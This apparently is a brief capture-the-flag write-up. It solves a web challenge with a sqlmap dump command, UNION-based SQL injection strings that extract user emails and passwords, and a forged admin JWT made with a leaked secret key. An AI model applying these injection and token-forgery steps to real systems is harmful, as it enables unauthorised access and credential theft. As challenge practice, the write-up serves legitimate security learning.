# Using SQL map

sqlmap -u cyberhacktivators.club:33010?term=1 -a

You will get the users and the routes (unique login route for each user)

# Using Union based sql
Find if sql is working then see the sqlite_information table for all table info
You will get the users and the routes table there.

' Union path description from routes --'
' Union email description from users --'
' Union password description from users --'

After that in the login you will see the login page, login using the email and password from users table.
You will get the session jwt token and it has another route and a type of user, change the type to admin and the jwt secret key is 'your-secret-key'.

In the new route you will get the flag
